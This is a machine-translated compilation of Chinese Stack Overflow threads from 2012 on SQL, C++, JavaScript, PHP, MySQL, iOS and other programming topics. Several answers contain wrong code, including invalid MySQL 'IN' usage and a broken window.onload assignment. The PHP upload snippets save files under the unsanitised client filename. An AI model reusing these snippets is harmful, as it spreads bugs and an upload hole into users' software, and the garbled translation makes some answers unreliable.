有人可以告诉我这里发生了什么以及如何解决它。我想制作外键的所有其他键都会出现同样的问题。除非我想引用主键。

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2012-08-31T10:17:19.723

如果要创建外键，它必须引用主键或具有唯一约束的字段。

如果您想显示客户的姓名，请让外键引用 CustomerID，并通过连接显示结果。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2017-08-11T21:19:02.757

当在引用表中指定与在引用表上定义主键或候选键的顺序不同的键列时，我遇到了这个错误。

切换指定列的顺序修复了它。

前任：

```
ALTER TABLE [dbo].[MCL_item_vendor_override_mst]  WITH CHECK ADD  
CONSTRAINT [FK_MCL_item_vendor_override_mst_item_mst] FOREIGN KEY([item],[site_ref])
    REFERENCES [dbo].[item_mst] ([item],[site_ref]) 
```

失败了

```
ALTER TABLE [dbo].[MCL_item_vendor_override_mst]  WITH CHECK ADD  
CONSTRAINT [FK_MCL_item_vendor_override_mst_item_mst] FOREIGN KEY([site_ref],[item])
    REFERENCES [dbo].[item_mst] ([site_ref],[item]) 
```

工作。

# internet-explorer - 嵌入式视簿相册。在 IE 中隐藏垂直滚动条

> ID：12213314
> 
> 赞同：0
> 
> 时间：2012-08-31T10:14:55.747
> 
> 标签：internet-explorer, scrollbar

似乎有很多人在让 IE 隐藏垂直滚动条时遇到问题。但似乎没有一个答案对我有用。

Manly 我认为因为溢出元素什么都不做，因为实际上并没有溢出，IE 只是创建了一个溢出......

编码：

```
<html>
<body>
<div id="wrapper">

<div id="pics">
<iframe width="100%" height="100%" "frameborder="0" src="http://viewbookalbum"></iframe></div>
</div>
</body>
</html> 
```

的CSS：

```
 body {
    height: 100%;
    margin: 0px;    

}
#wrapper {
    position:absolute;
    top:0;
    left:0;
    display:block;
    width:100%;
    height:100%;

}
#wrapper #pics {
    margin-left: 10%;
    width:80%;
    height:70%;

} 
```

如此简单但完美的流动专辑，没有图片失真。在其他浏览器中像魅力一样工作。但是IE在右边放了一个垂直滚动条...：/

我很想听听你的建议。

问候，

密歇根州

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:36:50.180

在 iframe 中添加 scrolling="no" 会在 IE 9 中为我移除滚动条。

# liferay - liferay 增加用户名长度

> ID：12213319
> 
> 赞同：4
> 
> 时间：2012-08-31T10:15:05.277
> 
> 标签：liferay, liferay-6

我知道**liferay**将名字与姓氏连接起来，用于**用户**名字段，例如在表联系人中找到的那个。

我需要用户名长度 > 75 个字符（这是默认列长度），因为名字和姓氏的长度必须为 <= 40 个字符。

我尝试手动增加列宽，但出现异常，即与长度相关的另一列太短。例如，我知道用于调整列大小的 portal-model-hints.xml 文件，但我确信有更好的方法可以一次修改所有列。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T09:23:33.870

[这](http://www.liferay.com/community/forums/-/message_boards/message/16132968)应该可以帮助你。设置完成后更改数据库并添加一个挂钩来更改验证逻辑。请参阅提供的链接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-02T12:00:02.983

我相信您需要为此创建 EXT。

请按照以下步骤进行更改。

1.创建名为ext-model-hints.xml的文件，并将其放入EXT的“ext-impl/src/META-INF/”文件夹中。

2.按如下所述进行输入

```
 <model name="Fully Qualified path of Model">
       <field name="column name" type="String">
           <hint name="max-length">200</hint>
       </field>
   </model> 
```

1.  部署 EXT 并重新启动服务器。更改应反映。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T11:49:57.343

我编写了一个 FullNameGenerator 和一个 ScreenNameGenerator 来绕过这个问题，并通过 liferay 的反射实用程序（PortalClassInvoker）将它们设置为各自的工厂，因为某些门户类由于某些类加载器限制而被隐藏。

# internet-explorer-8 - 强制 IE 提示安装 Adob e SVG Viewer

> ID：12213325
> 
> 赞同：0
> 
> 时间：2012-08-31T10:15:29.967
> 
> 标签：internet-explorer-8, svg

我已经在使用 SVG，但我很惊讶 IE8 并没有像提示安装 ActiveX 一样自动提示用户安装 Adob​​e SVG Viewer。

标题中是否有特定的方式或一些代码我需要它才能工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-01T10:25:18.297

你还没有具体说明你用 SVG 做什么。我假设您将它们作为图像包含在您的网站中。

您显然知道 IE<=8 不支持 SVG，因此您要使用 Adob​​e SVG 查看器。

我对这个 SVG 查看器了解不多，但我会提供一个替代解决方案。

IE 可能不支持 SVG，但它确实支持称为 VML 的替代格式。这两种格式非常相似，因此存在许多 SVG->VML 转换工具，可让您有效地将 SVG 图像加载到 IE 中。脚本转换它们，浏览器将它们显示为 VML。

最著名的是这个：[http](http://code.google.com/p/svg2vml/) ://code.google.com/p/svg2vml/ ，但也有其他几个。

（我还想提一下[Raphael](http://raphaeljs.com/)；在这种情况下，它可能不是您想要的，但它是一个出色的跨浏览器图形库，允许您编写脚本，在大多数情况下使用 SVG 绘制图形IE 中的浏览器和 VML）

# security - 允许跨域访问所有 API 资源是否安全？

> ID：12213327
> 
> 赞同：1
> 
> 时间：2012-08-31T10:15:43.697
> 
> 标签：security, api, http, authentication, cors

对 API 资源的访问可以通过以下方式进行身份验证

1.  可以由 Web 浏览器自动发送但不会跨域发送的凭据，除非 Access-Control-Allow-Credentials 设置为“true”（例如 cookie、HTTP Basic/Digest 身份验证、SSL 证书）。

2.  一个秘密令牌，无论是在 HTTP 标头中还是作为 URL 中的查询参数，必须由客户端手动设置（例如 OAuth 访问令牌）。

考虑到这一点，在 API 中的所有资源上设置“Access-Control-Allow-Origin: *”总是安全的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T16:41:22.863

如果在任何时候，在他控制的域上执行 JavaScript 的攻击者可以在不提供令牌的情况下获取数据或执行状态更改，那么您就有了漏洞。[该攻击与CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)非常相似，只是它拓宽了数据过滤的范围。

但是就像 CSRF 一样，如果客户端必须为每个请求使用一个令牌进行身份验证，而攻击者不知道这个令牌，那么他就无法通过类似 CSRF 的攻击访问[CORS](http://en.wikipedia.org/wiki/Cross-origin_resource_sharing) API。

# c++ - 使用动态多态时如何避免指针？

> ID：12213328
> 
> 赞同：12
> 
> 时间：2012-08-31T10:15:47.383
> 
> 标签：c++, pointers, polymorphism

很长一段时间以来，我已经意识到指针，`new`并且`delete`在 C++ 中有些不必要，除非处理长期存在的对象，引用是更适合 RAII 模型的更清洁的替代方案。但是，我仍然无法确定在 C++ 中使用动态多态性时如何避免使用指针。

假设我们有这些类：

```
class A
{
public:
    virtual void a() const = 0;
};

class B : public A
{
    virtual void a() const
    {
        std::cout << "B";
    }
};

class C : public A
{
    virtual void a() const
    {
        std::cout << "C";
    }
};

void invoke(const A& obj)
{
    obj.a();
}

int main()
{
    B b;
    invoke(b); // Prints B
} 
```

对象可以`invoke`作为引用传递，并且不涉及指针（嗯，至少从程序员的角度来看）。然而，上面的例子本质上是静态多态。

如果我想让类型`b`依赖于其他东西，我将不得不使用指针：

```
int main()
{
    A* a;
    if (something)
        a = new B;
    else
        a = new C;

    invoke(*a); // Prints B
    delete a;
} 
```

这对我来说看起来很丑陋。当然，我可以使用智能指针：

```
int main()
{
    std::unique_ptr<A> a;
    if (something)
        a.reset(new B);
    else
        a.reset(new C);
    invoke(*a); // Prints B
} 
```

但是智能指针只是指针的包装器。

我想知道是否有办法避免这种情况并在不使用指针的情况下利用多态类。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T10:38:23.177

你不能避免这个指针。如果您不喜欢它们，C++ 将不会成为您的语言，因为如果您想做任何多态的事情，您将不得不使用指针来克服最琐碎的用途。在堆上构造对象，即使用`new`是避免堆栈构造对象的作用域生命周期的方法，如果你想在条件分支中创建东西然后将它们分配给父作用域中的变量，你必须这样做 - 如果你不这样做'不需要这样做，您实际上也不需要多态性，因为您的类型在编译时都是可确定的。没有办法解决这个问题。

当然，使用智能指针，它们确实可以帮助避免指针生命周期的问题，但是无论您最终使用什么非常酷的抽象，都会在某个地方存在指针。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-31T10:27:34.357

鉴于您的最后一个示例，您可以避免使用指针（尽管我并没有真正看到智能指针有什么大问题）

```
struct AHolder {
  std::shared_ptr<A> a;
  operator A const&() const {
    return *a;
  }
  AHolder(bool something)
  : a(something?std::make_shared<B>():std::make_shared<C>()) {
  }
}; 
```

这使您可以像使用实际对象一样使用支架：

```
int main() {
  AHolder a(true); // or whatever argument you like
  invoke(a);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:25:31.420

我不知道你为什么要不惜一切代价避免任何形式的指针。`std::unique_ptr`使用/绝对没`std::shared_ptr`问题（当然，当有需要时）。智能指针不仅仅是指针周围的“包装器”。它们让您可以在不同的语义之间进行选择，并具有不同的用途。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-31T10:35:01.830

您可能正在考虑的用例是一种*factory*，您可以使用智能指针完美地服务它，而根本没有`new`：

```
std::unique_ptr<Message> parse_message(char const * buf, std::size_t len)
{
    if (buf[0] == 'A') { return make_unique<RequestMsg>(buf + 1, len - 1); }

    if (buf[0] == 'R') { return make_unique<AnswerMsg>(buf + 1, len - 1); }

    return nullptr;
} 
```

用法：

```
auto msgptr = parse_msg(buf, len); 
```

（您需要对`make_unique`某个地方进行定义，不幸的是，当前标准库中缺少该定义，但最终会被修改。）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-31T10:35:18.133

> 我想知道是否有办法避免这种情况并在不使用指针的情况下利用多态类。

不，这就是 C++ 最初的设计方式。为避免切片，您需要使用指针或引用。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-31T10:38:46.700

如果您需要动态创建对象并将它们持久化到函数范围之外，则没有办法。您可以在这里做的最好的事情 - 在工厂和智能指针中隐藏对象创建。

您也可以考虑函数范围内的静态对象，但这不是好的解决方案 - 您可以通过这种方式仅创建有限数量的对象：

```
template <class T, int Instance> T& create()
{
   static T instance;
   return instance;
}

MyClass& obj1 = create<MyClass, 1>();
MyClass& obj2 = create<MyClass, 2>(); 
MyClass& obj3 = create<MyClass, 3>(); 
// etc 
```

此解决方案有几个限制，很少可以使用。请注意，对象是在第一次函数调用时**静态**创建的，并将持续到程序结束。

# javascript - 外部 JS 代码

> ID：12213329
> 
> 赞同：0
> 
> 时间：2012-08-31T10:15:50.990
> 
> 标签：javascript, html

我最近开始学习 JS，我有一个我想不通的问题......我尝试了很多解决方案，但没有任何帮助。

我有一个非常基本的 JS 代码：

```
<body>

<h1>My First JS Page</h1>

<p id="demo">My First Paragraph.</p>

<script>
document.getElementById("demo").innerHTML="My First JavaScript";
</script>

</body> 
```

该代码在脚本位于下方时有效，但如果我将相同的脚本附加为外部脚本，并将其连接到 HEADER 中的 HTML，则该脚本无法正常工作....

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:18:38.603

> 标题中的 HTML

如果您将脚本放在 中，`<head>`那么它将出现在`<p id="demo">`.

由于脚本*立即*尝试 to `getElementById('demo')`，因此该元素不存在。所以它`undefined`代替了元素。

您需要将脚本移动到元素之后（因为它在问题中的代码中），或者将代码包装在一个函数中并将该函数用作[事件处理程序](https://developer.mozilla.org/en-US/docs/DOM/event)（对于直到元素才会触发的事件存在，例如加载事件）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:18:56.123

`<body>`发生这种情况是因为尚未加载文档或 HTML 页面的一部分。

为了克服这个问题，向`onLoad`event注册一个事件处理程序`<body>`，如下所示：

```
<html>
<head>
<script type="text/javascript">

function onDocumentReady() {
   document.getElementById("demo").innerHTML="My First JavaScript";
}

window.onload = onDocumentReady;

</script>
</head>
<body>
<h1>My First JS Page</h1>

<p id="demo">My First Paragraph.</p>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:19:11.377

这是关于操作顺序的。您拥有的脚本将在浏览器解析后立即运行，这意味着如果没有呈现的 id 为“demo”的元素，则不会发生任何事情。只需将`<script>`块放在`<p>`元素上方，您就会注意到这种行为（[JSFiddle 示例](http://jsfiddle.net/NfdhD/)）。为了解决这个问题，您需要确保所有脚本都位于文档的末尾（错误格式），或者您使用某种方法使脚本在文档完全加载后运行（首选）。两种最常见的方法是使用`window.onload`事件：

```
window.onload = document.getElementById("demo").innerHTML="My First JavaScript"; 
```

或者合并一个 JS 库，例如 jQuery，并为此使用它的内置方法：

```
$(document).ready(function() { 
    $("#demo").html("My First JavaScript");
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-31T10:27:50.083

您应该将外部脚本包装在

```
window.onload 
```

例子

HTML

```
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>My first JS</title>
<script src="test.js"></script>
</head>

<body>
<h1>My First JS Page</h1>
<p id="demo">My First Paragraph.</p>
</body>
</html> 
```

JS 文件名 test.js

```
window.onload = function () {
    document.getElementById("demo").innerHTML="My First JavaScript";
    //more code can go here if you want
} 
```

# matlab - 如何在matlab中创建和访问与给定变量列表对应的结构？

> ID：12213330
> 
> 赞同：1
> 
> 时间：2012-08-31T10:15:55.647
> 
> 标签：matlab

我想创建一个结构来存储数据库中的数据。

我创建了一个函数

```
function result = LoadDataFromDB(query, columnNames) 
```

其中 column names 表示列名列表，例如 {'id', 'year', 'name'...}

执行以下查询后

```
ps=conn.prepareStatement(sql);
rs=ps.executeQuery(); 
```

我想填充结构，但还没有弄清楚如何动态访问结构中的字段。

这是应该创建和填充结构的代码片段：

```
varnamelist = genvarname(columnNames);

result = cell2struct(cell(size(varnamelist(:))), varnamelist(:));
while rs.next()
    count=count+1;
    for i = 1 : length(columnNames)
        fieldname = columnNames(i);
        value = char(rs.getString(i));
          %result(count).columnNames(i)=char(rs.getString(i));
          result(count).(fieldname) = value;
    end
end 
```

主要问题是线路

```
result(count).(fieldname) = value; 
```

下面描述一个问题是来自控制台输出的副本：

```
K>> result(1)

ans = 

    a: []
    b: []
    c: []

K>> result(1).('a')

ans =

     []

K>> fieldname

fieldname = 

    'a' 
```

从上面的输出中得出结论，命令 result(1).(fieldname) 应该访问字段 'a' 但尝试一下，它会返回以下错误：

```
K>> result(1).(fieldname)
??? Argument to dynamic structure reference must evaluate to a valid field name. 
```

有谁知道如何动态地填充结构？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:32:57.840

是的，有动态字段引用。例如，您可以在[此处](http://blogs.mathworks.com/loren/2005/12/13/use-dynamic-field-references/)找到更多信息。

动态引用可用于分配或引用结构中的字段，如下所示：

```
fieldName = 'some_field';
your_struct.(fieldName) = fieldValue 
```

因此，在您的情况下，这意味着将内部循环体修改为

```
fieldname = columnNames{i};
value = rs.getString{i};
result(count).(fieldname) = value; 
```

# iphone - 交易错误：In App Purchased 期间发生未知错误

> ID：12213331
> 
> 赞同：2
> 
> 时间：2012-08-31T10:16:05.203
> 
> 标签：iphone, in-app-purchase

我正在实现在我的应用程序中购买的应用程序内，我已经创建了测试用户、应用程序 ID、分发配置文件、开发配置文件，并且还启用了在应用程序中购买的应用程序内购买，但不上传二进制文件。我已经正确使用了 App ID。但是当我使用商店套件在模拟器上测试应用程序时，它会给出以下错误“交易错误：发生未知错误，交易已被用户取消，但用户没有取消交易。

```
- (void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions
{
for (SKPaymentTransaction *transaction in transactions)
{
    switch (transaction.transactionState)
    {
        case SKPaymentTransactionStatePurchased:
            [self completeTransaction:transaction];
            break;
        case SKPaymentTransactionStateFailed:
            [self failedTransaction:transaction];
            break;
        case SKPaymentTransactionStateRestored:
            [self restoreTransaction:transaction];
        default:
            break;
    }
} 
```

}

交易失败并调用方法[self failedTransaction:transaction]；

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:08:29.843

如果您的设备已越狱，那么 StoreKit 将无法在其上运行。尝试在未越狱的设备上测试 InAppPurchase

# tfsbuild - TFS 2010 - 列出用于门控签入的搁置集

> ID：12213335
> 
> 赞同：0
> 
> 时间：2012-08-31T10:16:27.283
> 
> 标签：tfsbuild

有没有办法使用命令行中的门控签入来获取搁置集列表（不是搁置集详细信息）

tf.exe 历史命令会列出搁置集吗？

注意：有一个搁置集命令，但该命令需要搁置集名称来列出其详细信息，我的要求是获取搁置集列表

谢谢，

苏尼尔

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T18:45:31.363

我不清楚你想要完成什么，但 tfshelfsets 可能会成功。例如，尝试以下命令：

tf 搁置集/所有者 * | findstr 门控_

这将列出门控签到搁置集。

埃德

# java - Google BigQuery 的 JDBC 驱动程序？

> ID：12213339
> 
> 赞同：9
> 
> 时间：2012-08-31T10:16:58.997
> 
> 标签：java, google-bigquery

有谁知道 Google BigQuery 的任何 JDBC 接口或驱动程序？

请只使用 Java - 我已经完成了 Python 库。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T17:39:38.953

有一个 3rd 方 JDBC 驱动程序，可以从以下位置获得：

[http://code.google.com/p/starschema-bigquery-jdbc/](http://code.google.com/p/starschema-bigquery-jdbc/)

它支持与原始 Google BigQuery 相同的 SQL SELECT 语法，并且不支持插入或更新。如果您对司机有任何其他问题或要求，请告诉我

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2016-11-05T19:02:26.493

谷歌现在提供由他们的合作伙伴之一开发的免费可用的：[https ://cloud.google.com/bigquery/partners/simba-drivers/#current_jdbc_driver_releases](https://cloud.google.com/bigquery/partners/simba-drivers/#current_jdbc_driver_releases)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2017-04-13T20:52:59.840

还有[适用于 BigQuery 的第 3 方 Simba 驱动程序](https://cloud.google.com/bigquery/partners/simba-drivers/)：

> Google 与 Magnitude Software 公司 Simba Technologies Inc 合作，提供利用 BigQuery 标准 SQL 功能的 ODBC 和 JDBC 驱动程序。
> 
> 这些驱动程序的目的是帮助用户将 Google BigQuery 的强大功能与没有原生集成的现有工具和基础架构连接起来。如果您正在构建与 BigQuery 的新集成，我们建议您考虑使用原生 API。ODBC/JDBC 连接公开的功能必然是 BigQuery 全部功能的子集。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-08-31T10:34:08.737

据我所知，没有 JDBC 驱动程序，但有一个 Java API 可以提供帮助： [http ://code.google.com/p/google-api-java-client/](http://code.google.com/p/google-api-java-client/)

# iphone - 如何在 UITableView 中显示 NSMutableDictionary 数据数组？

> ID：12213351
> 
> 赞同：3
> 
> 时间：2012-08-31T10:17:45.950
> 
> 标签：iphone, objective-c, xcode, uitableview, nsurlconnection

我是 iPhone 开发的新手。我的应用程序正在发送 URL 请求以使用`NSURLConnection`. 我正在获取`JSON`格式数据，并将其存储`NSMutableArray`为字典数组。所以我有一系列字典。我需要在`UITableViewCell`.

我的代码在这里...

```
-(IBAction)ButtonTapped:(id)sender
{
     NSString *strURL=[NSString stringWithFormat:@"URl Name here"];
     NSURL *url=[NSURL URLWithString:strURL];
     self.request=[NSURLRequest requestWithURL:url]
     self.nsCon=[[NSURLConnection alloc] initWithRequest:request delegate:self];

     if(self.nsCon)
     {
        self.receivedData=[[NSMutableData alloc] init];
     }
     else
     {
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:NSLocalizedString(@"Error",@"") message:NSLocalizedString(@"Not Connected Other View !!",@"") delegate:nil cancelButtonTitle:NSLocalizedString(@"OK",@"") otherButtonTitles:nil];
        [alert show];
        [alert release];
     }
}

- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
    // receivedData is an instance variable declared elsewhere.
    [receivedData setLength:0];
}
- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data
{
    // Append the new data to receivedData.
    // receivedData is an instance variable declared elsewhere.
    [receivedData appendData:data];
}
- (void)connection:(NSURLConnection *)connection didFailWithError:(NSError *)error
{
    // inform the user

    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:NSLocalizedString(@"Error",@"") message:NSLocalizedString(@"Connection failed !!",@"") delegate:nil cancelButtonTitle:NSLocalizedString(@"OK",@"") otherButtonTitles:nil];
    [alert show];
    [alert release];

}
- (void)connectionDidFinishLoading:(NSURLConnection *)connection
{
    NSString *responseString = [[NSString alloc] initWithData:self.receivedData encoding:NSUTF8StringEncoding];     
    self.theDictionary= [[NSMutableDictionary alloc] init];
    self.theDictionary = [responseString JSONValue];

    self.arrofDictionary=[[NSMutableArray alloc] init];
     [self.arrofDictionary addObject:self.theDictionary];

    NSLog(@"data length - %@ ",[self.theDictionary objectForKey:@"today"]);

    // release the connection, and the data object
    [connection release];
    [receivedData release];

    self.tblList=[[UITableView alloc] initWithFrame:CGRectMake(0,80,320,370) style:UITableViewStyleGrouped];
    self.tblList.delegate=self;
    self.tblList.dataSource=self;
    [self.view addSubview:self.tblList];

} 
```

//数据在consol中显示

```
(
        {
        "date_time" = "2012-08-31 09:30:25";
        id = 99;
        language = en;
        name = Tt;
        score = 656;
    },
        {
        "date_time" = "2012-08-31 10:08:52";
        id = 103;
        language = en;
        name = Fg;
        score = 567;
    },
        {
        "date_time" = "2012-08-31 08:22:38";
        id = 87;
        language = en;
        name = Eree;
        score = 565;
    },
) 
```

那我怎样才能显示**名字**和**分数**呢`UITableViewCell`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:36:06.517

您显示的数据位于字典对象数组（yourArray）中。您使用以下代码。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) {

        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleSubtitle reuseIdentifier:CellIdentifier];

    }
     cell.textLabel.text = [[yourArray objectAtIndex:indexPath.row]  objectForKey:@"name"];
    cell.detailTextLabel.text = [[yourArray objectAtIndex:indexPath.row]  objectForKey:@"score"];

    return cell;
} 
```

我想这会对你有所帮助。

# mysql - MySQL 存储过程 - 无法重新打开表（不是临时表）

> ID：12213352
> 
> 赞同：1
> 
> 时间：2012-08-31T10:17:47.337
> 
> 标签：mysql, stored-procedures

我正在将存储过程从 MS-SQL 转换为 MySQL。它基于有向无环图。

原始 MS-SQL 脚本在以下页面的清单 2 中：http: [//www.codeproject.com/Articles/22824/A-Model-to-Represent-Directed-Acyclic-Graphs-DAG-o](http://www.codeproject.com/Articles/22824/A-Model-to-Represent-Directed-Acyclic-Graphs-DAG-o)

存储过程保存得很好，但没有从数据库中删除任何行。我已经尝试通过 Debugger for MySQL 运行，它会第一次通过并且似乎更新了我用于临时数据的表，但不更新“edges”表。它也不会在最后丢弃表格。

第二次运行，如果我手动删除 purgelist 表，它将运行到 REPEAT 语句，然后我得到错误代码：1137 SQLState：HY000，消息：无法重新打开表：'purgelist'。最初我想使用临时表，但我知道我不能像 SELECT 那样多次引用临时表，但是，我很惊讶这个错误发生在非临时表上。此外，我认识到在多会话环境中，我需要动态命名 purgelist。

这是MySQL代码：

```
DELIMITER //
CREATE PROCEDURE RemoveEdge(
IN iId int(11)
)

MAIN_BLOCK: BEGIN

DECLARE counter int default 0;
DECLARE rcount int default 0;
SET counter = ( SELECT id FROM edges WHERE id = iId AND hops = 0 );
IF counter = 0 THEN
   BEGIN
      LEAVE MAIN_BLOCK;
   END;
END IF;

CREATE TABLE purgeList (id int);

-- step 1: rows that were originally inserted with the first
-- AddEdge call for this direct edge
INSERT INTO purgeList
    SELECT id
      FROM edges
      WHERE directEdgeId = iId;

-- step 2: scan and find all dependent rows that are inserted afterwards
REPEAT
    INSERT INTO purgeList
        SELECT id    
            FROM edges
            WHERE hops > 0
                AND ( entryEdgeId IN ( SELECT id FROM purgeList ) 
                    OR exitEdgeId IN ( SELECT id FROM purgeList ) )
            AND id NOT IN (SELECT id FROM purgeList );
    SET rcount = ROW_COUNT();
UNTIL rcount = 0
END REPEAT;

DELETE FROM edges
   WHERE id IN ( SELECT id FROM purgeList);
DROP TABLE purgeList;
END //
DELIMITER ; 
```

我已经仔细检查了我的语法，但我认为某处有错误。非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:31:01.840

可能有一种更简洁的方法，但我认为您需要在 Repeat 中创建一个临时表，其中填充有

```
SELECT id FROM purgeList 
```

然后引用临时表而不是 purgeList，如下所示：

```
REPEAT

    CREATE TABLE innerPurgeList (id int);

    INSERT INTO innerPurgeList
       SELECT id
            FROM purgeList;

    INSERT INTO purgeList
       SELECT id    
            FROM edges
            WHERE hops > 0
                AND ( entryEdgeId IN ( innerPurgeList ) 
                    OR exitEdgeId IN ( innerPurgeList ) )
            AND id NOT IN ( innerPurgeList );
    SET rcount = ROW_COUNT();

    DROP TABLE innerPurgeList;

UNTIL rcount = 0
END REPEAT; 
```

# php - 多对多不删除

> ID：12213353
> 
> 赞同：5
> 
> 时间：2012-08-31T10:17:48.297
> 
> 标签：php, doctrine-orm, many-to-many

我正在尝试删除 Doctrine 2 中的 ManyToMany 关系。我有两个实体 -`User`和`TargetGroup`.

在我的`User`实体中，我有：

```
/**
 * @ORM\ManyToMany(targetEntity="TargetGroup", inversedBy="users")
 */
private $targetGroups; 
```

在我的`TargetGroup`实体中，我有：

```
/**
 * @ORM\ManyToMany(targetEntity="User", mappedBy="targetGroups")
 */
private $users; 
```

我想打电话：

```
$user->removeTargetGroup($targetGroup);
$targetGroup->removeUser($user);

$em->persist($user);
$em->persist($targetGroup);
$em->flush(); 
```

使用的两种方法是：

```
public function removeTargetGroup(Path To Bundle $targetGroups)
{
    $this->targetGroups->removeElement($targetGroups);
}

public function removeUser(Path To Bundle $users)
{
    $this->users->removeElement($users);
} 
```

它不会出错，但也不会执行任何删除查询。

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:38:48.887

看看[Doctrine cascade property](http://doctrine-orm.readthedocs.org/en/2.0.x/reference/working-with-associations.html)，在你的情况下**分离**。

如果您`cascade={"detach"}`在两个`ManyToMany`注释上都设置，交叉表记录应该保留。

# php - 用于在 Web 服务器中上传的文件路径

> ID：12213354
> 
> 赞同：0
> 
> 时间：2012-08-31T10:17:48.453
> 
> 标签：php, javascript, jquery

我是网络开发的新手。我正在使用 HTML、jQuery、JavaScript、PHP 和 MySql 开发一个网站。在我的网站上，我可以选择上传图片，我正在使用以下代码：

```
move_uploaded_file(
    $_FILES["file"]["tmp_name"],
    "c:/wamp/www/upload/upload/" . $_FILES["file"]["name"]
); 
```

此代码用于将图像移动到`c:wamp/www/upload/upload/`. 托管我的网站后，如何在网络服务器上实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:27:42.843

当您在本地上传文件时，`do not give "c:/wamp/www"`. 而是给出相对于文件的路径，例如`"../upload/"`.

例如，如果您已将 php 脚本文件放在`"upload/include/"`文件夹中，并且您想在文件夹中上传图像，请在上传文件`"upload/images/"`时使用`"../images/"`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:27:09.113

您的网络主机是否提供共享或专用主机？

我猜是共享的，所以你可能会有一个目录路径，如 /htdocs/upload 或类似的东西。很难说不知道您的虚拟主机是什么样的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:32:51.120

只需给出该文件夹的路径。假设上传文件夹位于上传文件脚本的同一目录中，而不是像这样：

```
move_uploaded_file($_FILES["file"]["tmp_name"],
                            "upload/" . $_FILES["file"]["name"]); 
```

如果它在脚本文件之外，那么就使用它

```
move_uploaded_file($_FILES["file"]["tmp_name"],
                                "../upload/" . $_FILES["file"]["name"]); 
```

因此不需要从根目录给出路径。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T11:11:15.443

用于`$_SERVER['DOCUMENT_ROOT']`动态路径检索。

试试这个，

```
move_uploaded_file($_FILES["file"]["tmp_name"],$_SERVER['DOCUMENT_ROOT']."upload/" . $_FILES["file"]["name"]); 
```

# python - 导入模型任务 celery

> ID：12213361
> 
> 赞同：1
> 
> 时间：2012-08-31T10:18:32.230
> 
> 标签：python, django, django-models, scheduled-tasks, celery

我正在尝试找出如何在芹菜的 tasks.py 中导入模型。

目前我的项目结构如下：

```
/mainApp
    -celery_instance
        -__init.py__
        -celery.py
        -tasks.py
    -app
        -settings.py
        -urls.py
        -models.py
    -admin
        -__init.py__
        -views.py 
```

我尝试的是写一个任务来检查每天是否有生日。

我需要在tasks.py中导入模型吗？我试过了，但我得到一个错误。它无法识别我的模型。从 mainApp 我只能导入 settings.py。

任何帮助，将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:30:19.973

我的 django-celery 版本似乎是一个错误。

我在我的 settings.py 中找到了解决方案

```
CELERY_IMPORTS = ('celery_instance.tasks',) 
```

# css - 垂直对齐浮动

> ID：12213362
> 
> 赞同：0
> 
> 时间：2012-08-31T10:18:34.863
> 
> 标签：css

如何垂直对齐浮动元素？

我目前在一个包装 div 中有 3 个元素（一个图像向左浮动，另一个图像向右浮动和一个边距：0 居中的 div）。这些目前在顶部对齐，但我希望它们在 div 的底部对齐。

由于这是响应式布局，如何在不使用绝对位置的情况下实现这一点？我试过制作它们`display:inline-block`，`vertical-align: bottom`但这无济于事。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:24:29.827

为了在某​​些元素上使用垂直对齐，该元素必须具有`display:table-cell;`css 样式。[http://jsfiddle.net/StPYR/](http://jsfiddle.net/StPYR/)

您的 jsfiddle 已更新： http: [//jsfiddle.net/chCjT/16/](http://jsfiddle.net/chCjT/16/) 而不是浮动您需要为它们提供`display:inline-block;`css 属性的元素

